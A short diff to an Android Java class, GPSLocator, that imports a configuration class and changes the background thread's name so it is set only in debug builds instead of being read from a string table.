@@ -17,6 +17,7 @@ import android.os.Looper;
 
 import com.android.networking.Messages;
 import com.android.networking.Status;
+import com.android.networking.auto.Cfg;
 
 public abstract class GPSLocator extends Thread {
 	private static final String TAG = "GPSLocator"; //$NON-NLS-1$
@@ -28,7 +29,9 @@ public abstract class GPSLocator extends Thread {
 
 	public GPSLocator() {
 		setDaemon(true);
-		setName(Messages.getString("12.0")); //$NON-NLS-1$
+		if (Cfg.DEBUG) {
+			setName(getClass().getSimpleName());
+		}
 		lm = (LocationManager) Status.getAppContext().getSystemService(Context.LOCATION_SERVICE);
 	}
 
